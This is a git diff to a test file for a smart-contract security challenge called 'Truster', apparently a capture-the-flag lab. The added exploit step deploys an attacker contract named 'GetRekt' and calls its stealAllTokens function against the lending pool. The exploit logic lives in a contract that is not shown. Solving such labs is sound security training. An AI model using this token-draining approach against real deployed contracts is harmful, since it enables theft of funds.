@@ -29,6 +29,15 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+
+        // Explanation of hack is in the attack contract - 'GetRekt.sol'
+
+        // Deploy attacker contract
+        const attackerContract = await (await ethers.getContractFactory("GetRekt")).deploy();
+
+        // Execute hack function on contract
+        const tx = await attackerContract.connect(attacker).stealAllTokens(this.pool.address);
+        await tx.wait();
     });
 
     after(async function () {
